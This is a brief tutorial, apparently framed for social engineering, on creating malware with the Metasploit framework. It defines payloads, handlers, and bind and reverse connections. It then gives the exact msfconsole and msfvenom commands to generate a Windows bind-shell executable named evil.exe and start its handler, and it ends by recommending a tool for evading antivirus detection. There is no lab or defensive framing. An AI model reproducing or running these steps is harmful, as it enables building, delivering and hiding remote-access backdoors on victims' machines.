Creating Malware For SE

Malware Consists of Two Parts

1) Payload: the malicious code responsible for exploiting the target’s device. When a user opens a file, payload code is executed, infecting the. machine.

2) Handler: a command and control center that issues the commands for the payload to execute on the target machine.

Establishing a Connection Between the Target and Attacker

There are two types of connections:

1) Bind connection

	1) The payload starts a listener on the target’s machine which opens a port.

	2) The attacker connects to the newly opened port and issues commands using the handler.

	3) Bind connections are useful when the firewall allows inbound connections.

2) Reverse connection

	1) The exploit code initiates a connection back to the attacker’s machine

	2) A listener on the attacker's machine is running and waiting for any connection that comes in.

	3) Reverse connections are useful when the firewall allows outbound connections.

Creating Malware Using Metasploit-Framework

1) Open a terminal window and launch the Metasploit framework

msfconsole

2) Load the Handler module

use exploit/multi/handler

3) Issue the show payloads command to see the list of available payloads

show payloads

4) Set the desired payload using set payload (payloadhere)

set payload windows/shell_bind_tcp

5) Check the options using show options

show options

6) Utilize the set command to set options

set lport 123
set rhost 10.10.10.20

7) Create the payload file using msfvenom -p (payloadhere) (optionshere) -f (formathere)

msfvenom -p windows/shell_bind_tcp lport=123 -f exe > ~/Desktop/evil.exe

You can check available formats using

msfvenom --list formats.

8) Start the handler using run

run

New Terms

Bind Connection: A connection where the attacker's machine connects to an open port on the target's machine

Handler: The piece of code that an attacker uses to issue commands to the infected victim machine

Payload: The malicious code that infects a target system

Reverse Connection: A connection where the target's machine connects back to an open port on the attacker's machine

Further Reading

Payloads created by Metasploit-Framework may get detected by endpoint protection like antivirus software. This article from Hacking Loops talks about how to get around this issue: Why Venom Is The Ultimate Payload and Shellcode Generator(https://www.hackingloops.com/venom-shellcode-payload-generator/). It talks about Venom-Framework which uses Metasploit-Framework payloads as a base but is able to evade most of the endpoint protection solutions in the market.




















































